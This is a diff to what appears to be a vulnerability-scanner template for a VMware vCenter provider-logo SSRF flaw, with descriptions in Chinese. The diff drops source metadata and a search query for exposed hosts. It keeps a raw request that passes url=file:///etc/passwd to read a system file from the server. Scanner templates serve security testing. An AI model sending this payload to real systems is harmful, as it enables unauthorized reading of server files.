@@ -3,14 +3,8 @@ info:
   name: VMwarevCenterprovider-logo存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a882866ca2e025fff1b6c26a4581c474
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: ssrf,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a882866ca2e025fff1b6c26a4581c474
-    fofa: + fofa`title="ID_VC_Welcome"`
 http:
 - raw:
   - 'GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/2.0
